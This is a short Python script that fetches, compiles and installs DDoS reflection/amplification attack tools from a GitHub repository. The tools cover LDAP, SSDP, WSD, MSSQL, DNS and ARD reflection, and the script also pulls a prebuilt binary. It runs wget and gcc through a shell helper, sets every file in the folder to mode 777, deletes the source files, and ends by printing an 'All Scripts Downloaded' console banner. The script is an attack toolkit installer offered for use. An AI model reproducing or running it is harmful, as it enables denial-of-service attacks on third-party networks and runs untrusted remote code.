import subprocess

def Zuko(cmd):
    subprocess.call(cmd, shell=True)

white = "\x1b[1;37m"
yellow = "\x1b[1;33m"
blue = "\x1b[1;34m"
cyan = "\x1b[1;36m"
green = "\x1b[1;32m"

Zuko("cd IPHM/ && wget -q https://raw.githubusercontent.com/Vexvain/Exclusion/main/AMP/methods/layer4/reflection/ldap/ldap.c -O ldap.c; gcc -o ldap -w ldap.c -pthread; cd")
Zuko("cd IPHM/ && wget -q https://raw.githubusercontent.com/Vexvain/Exclusion/main/AMP/methods/layer4/reflection/ssdp/ssdp.c -O ssdp.c; gcc -o ssdp -w ssdp.c -pthread; cd")
Zuko("cd IPHM/ && wget -q https://github.com/Vexvain/Exclusion/blob/main/AMP/methods/layer4/reflection/ard/ard -O ard && chmod +x ard; cd")
Zuko("cd IPHM/ && wget -q https://raw.githubusercontent.com/Vexvain/Exclusion/main/AMP/methods/layer4/reflection/wsd/wsd.c.1 -O wsd.c; gcc -o wsd -w wsd.c -pthread; cd")
Zuko("cd IPHM/ && wget -q https://raw.githubusercontent.com/Vexvain/Exclusion/main/AMP/methods/layer4/reflection/mssql/mssql.c -O mssql.c; gcc -o mssql -w mssql.c -pthread; cd")
Zuko("cd IPHM/ && wget -q https://raw.githubusercontent.com/Vexvain/Exclusion/main/AMP/methods/layer4/reflection/dns/dns.c -O dns.c; gcc -o dns -w dns.c -pthread; cd")
Zuko("cd IPHM/ && chmod 777 * && cd")
Zuko("cd IPHM/ && rm -rf ldap.c ssdp.c wsd.c mssql.c dns.c && cd")
print(""+ white +"["+ yellow +"Console"+ white +"] - ["+ blue +"Event"+ white +"] - ["+ green +"IPSP"+ white +"/"+ cyan +"All Scripts Downloaded"+ white +"]")
